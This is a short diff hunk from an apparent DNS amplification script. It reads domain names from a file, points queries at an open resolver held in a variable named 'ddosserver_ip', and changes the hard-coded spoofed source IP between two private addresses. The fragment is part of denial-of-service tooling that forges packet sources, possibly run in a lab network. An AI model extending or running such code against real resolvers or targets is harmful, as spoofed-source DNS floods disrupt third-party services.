@@ -27,7 +27,7 @@ with open("/home/cognet/domain.txt", 'r') as file:
 
 open_dns_resolver = ddosserver_ip  # Replace with the IP address of your DNS server
 # Generate spoofed ip addres
-spoofed_ip = "10.244.8.187"
+spoofed_ip = "10.0.25.1"
 
 for _ in range(dns_query_packets):
     qname = random.choice(qnames)
